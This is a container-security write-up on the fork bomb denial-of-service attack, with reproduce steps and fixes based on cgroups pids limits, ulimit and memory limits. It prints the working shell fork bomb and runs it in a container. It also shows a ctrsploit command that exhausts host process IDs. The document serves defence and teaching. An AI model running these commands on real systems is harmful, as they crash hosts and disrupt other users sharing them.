# Fork Bomb

## 1. Vulnerability Overview

A Fork Bomb is a classic Denial of Service (DoS) attack. 
An attacker uses a process that recursively creates copies of itself, 
rapidly consuming system resources such as Process Identifiers (PIDs) and memory, 
causing the system to become slow or even crash. 
A well-known example of a shell Fork Bomb is `:(){ :|:& };:`.

## 2. Exploit Scenario

insecure configuration

## 3. Prerequisites

unlimited cgroupd/pids.max config

## 4. Vulnerability Existence Check

`ctrsploit checksec fork-bomb`

## 5. Reproduce

![](./video.svg)

### 5.1 Reproduce Environment

```shell
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive/vul/fork-bomb
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

### 5.2 Reproduce Steps


terminal 1

```shell
$ ./ssh
root@localhost:~# while true; do cat /proc/sys/kernel/ns_last_pid && sleep 1; done 
642
...
```

terminal 2
```shell
$ ./ssh
root@localhost:~# docker run -ti busybox ash
/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul fork-bomb c
[Y]  fork-bomb	

/ # ctrsploit vul fork-bomb x

```

terminal 1

```shell
root@localhost:~# while true; do cat /proc/sys/kernel/ns_last_pid && sleep 1; done 
642
644
646
648
8607
-bash: fork: retry: Resource temporarily unavailable
-bash: fork: retry: Resource temporarily unavailable
```


## 6. Fix

### 1. Best Practices: cgroups pids.max

Using the `pids` controller of Control Groups (cgroups) is currently the most direct, effective, and standard method to prevent Fork Bombs.

**Principle**: cgroups is a core feature of the Linux kernel used to limit, account for, and isolate the resource usage of a group of processes. The `pids` controller is specifically designed to limit the total number of tasks (processes or threads) that can be created within a cgroup.

**Why is this the best practice?**

*   **Precise Scope**: The design of cgroups fits perfectly with the container model. All processes within a container belong to the same cgroup, allowing for precise limitation of the total number of processes for the entire container, preventing it from affecting the host or other containers.
*   **Effective for All Users**: Unlike `ulimit`, cgroups pids limits are effective for all users within the cgroup, including the root user. This addresses the biggest shortcoming of the traditional `RLIMIT_NPROC` method.
*   **Directly Effective**: The `pids` controller directly targets the root cause of the problem—unlimited process creation—making it the most reliable means of preventing Fork Bombs.

More details, see here: https://github.com/moby/moby/issues/6479


e.g.

```shell
root@localhost:~# docker run --rm -it --pids-limit=3 busybox /bin/sh
Unable to find image 'busybox:latest' locally
latest: Pulling from library/busybox
e59838ecfec5: Pull complete 
Digest: sha256:e3652a00a2fabd16ce889f0aa32c38eec347b997e73bd09e69c962ec7f8732ee
Status: Downloaded newer image for busybox:latest
/ # sleep 111 &
/ # sleep 111 &
/ # sleep 111 &
/bin/sh: can't fork: Resource temporarily unavailable
```

### 2. Maybe Useful but not the best

#### 2.1 RLIMIT_NPROC (ulimit -u)

`RLIMIT_NPROC` is a traditional POSIX resource limit mechanism, set via the `setrlimit()` system call or the `ulimit -u` command, but it has significant limitations.

##### (1) RLIMIT_NPROC is scoped per user

Each UID (the owner in the context of a user namespace) has a `user_struct`/`ucounts` to track resource usage counts, such as the number of processes.

When a new task is attempted, the kernel's creation process checks the current process count for the corresponding user against the `rlimit(RLIMIT_NPROC)` value (by calling functions like `is_rlimit_overlimit` / `get_rlimit_value`) and decides whether to allow or deny the creation. If allowed, the kernel increments the user's count upon successful creation; if creation fails, it rolls back. The relevant operations are distributed across `fork`/`copy_process`/`do_fork` and ucount management functions.

https://github.com/torvalds/linux/blob/v6.17/kernel/ucount.c#L295-L341

```c
long inc_rlimit_ucounts(struct ucounts *ucounts, enum rlimit_type type, long v)
{
	struct ucounts *iter;
	long max = LONG_MAX;
	long ret = 0;

	for (iter = ucounts; iter; iter = iter->ns->ucounts) {
		long new = atomic_long_add_return(v, &iter->rlimit[type]);
		if (new < 0 || new > max)
			ret = LONG_MAX;
		else if (iter == ucounts)
			ret = new;
		max = get_userns_rlimit_max(iter->ns, type);
	}
	return ret;
}

bool is_rlimit_overlimit(struct ucounts *ucounts, enum rlimit_type type, unsigned long rlimit)
{
	struct ucounts *iter;
	long max = rlimit;
	if (rlimit > LONG_MAX)
		max = LONG_MAX;
	for (iter = ucounts; iter; iter = iter->ns->ucounts) {
		long val = get_rlimit_value(iter, type);
		if (val < 0 || val > max)
			return true;
		max = get_userns_rlimit_max(iter->ns, type);
	}
	return false;
}

```

```shell
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive/docker/v28.3.2
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
root@localhost:~# docker run -tid -u daemon --ulimit nproc=5 busybox cat
7b86105491860ea5347cc58983ee017be29eba58c3ffba4f4afce499479e0f6e
root@localhost:~# docker logs 7b8
root@localhost:~# docker run -tid -u daemon --ulimit nproc=5 busybox cat
66031e7c1d7adae78c500b5efd92a663b6c7db41402cf7a2d27572fbc25bf5c9
root@localhost:~# docker logs 660
exec /bin/cat: resource temporarily unavailable
root@localhost:~# docker ps 
CONTAINER ID   IMAGE     COMMAND   CREATED          STATUS          PORTS     NAMES
7b8610549186   busybox   "cat"     18 seconds ago   Up 18 seconds             thirsty_mcclintock
```

##### (2) RLIMIT_NPROC is not effective for privileged users

`RLIMIT_NPROC` is not enforced for the root user in the initial user namespace (`INIT_USER_NS`) who has `CAP_SYS_RESOURCE` or `CAP_SYS_ADMIN` capabilities.

See:

> The RLIMIT_NPROC limit is not enforced for processes that
> have either the CAP_SYS_ADMIN or the CAP_SYS_RESOURCE
> capability, or run with real user ID 0.
> https://man7.org/linux/man-pages/man2/setrlimit.2.html

https://github.com/torvalds/linux/blob/v6.17/kernel/fork.c#L2044-L2045

```c
if (is_rlimit_overlimit(task_ucounts(p), UCOUNT_RLIMIT_NPROC, rlimit(RLIMIT_NPROC))) {
    if (p->real_cred->user != INIT_USER &&
        !capable(CAP_SYS_RESOURCE) && !capable(CAP_SYS_ADMIN))
        goto bad_fork_cleanup_count;
}
```

e.g.

```shell
root@localhost:~# ulimit -u 3
root@localhost:~# ulimit -u
3
root@localhost:~# sleep 9999 &
[8] 246100
root@localhost:~# sleep 9999 &
[9] 246101
root@localhost:~# sleep 9999 &
[10] 246102
root@localhost:~# sleep 9999 &
[11] 246103
root@localhost:~# sleep 9999 &
[12] 246104
root@localhost:~# sleep 9999 &
[13] 246105
root@localhost:~# ps -ef |grep sleep
root      246100    1240  0 11:59 pts/1    00:00:00 sleep 9999
root      246101    1240  0 11:59 pts/1    00:00:00 sleep 9999
root      246102    1240  0 11:59 pts/1    00:00:00 sleep 9999
root      246103    1240  0 11:59 pts/1    00:00:00 sleep 9999
root      246104    1240  0 11:59 pts/1    00:00:00 sleep 9999
root      246105    1240  0 11:59 pts/1    00:00:00 sleep 9999
root      246107    1240  0 11:59 pts/1    00:00:00 grep --color=auto sleep
```

#### 2.2 docker --memory, --kernel-memory

A Fork Bomb can be indirectly mitigated by limiting the container's memory.

Although each process in a Fork Bomb is simple, it still consumes memory (e.g., for storing process metadata in `task_struct`, kernel stack, etc.). By limiting the total memory usage of the container, new process creation can be stopped when memory is exhausted, thus indirectly halting the Fork Bomb.

e.g.

```shell
root@localhost:~# docker run -it --memory=20m ubuntu
root@6815d730cf46:/# :(){ :|:& };:
[1] 10
root@6815d730cf46:/# 
root@localhost:~# dmesg
...
[ 8654.886516] oom-kill:constraint=CONSTRAINT_MEMCG,nodemask=(null),cpuset=docker-6815d730cf460a9247e8c1a19ae539dc08a1436a1cbafb096afd106e5d63d082.scope,mems_allowed=0,oom_memcg=/system.slice/docker-6815d730cf460a9247e8c1a19ae539dc08a1436a1cbafb096afd106e5d63d082.scope,task_memcg=/system.slice/docker-6815d730cf460a9247e8c1a19ae539dc08a1436a1cbafb096afd106e5d63d082.scope,task=bash,pid=371272,uid=0
[ 8654.886528] Memory cgroup out of memory: Killed process 371272 (bash) total-vm:4588kB, anon-rss:512kB, file-rss:3328kB, shmem-rss:0kB, UID:0 pgtables:48kB oom_score_adj:0
...
```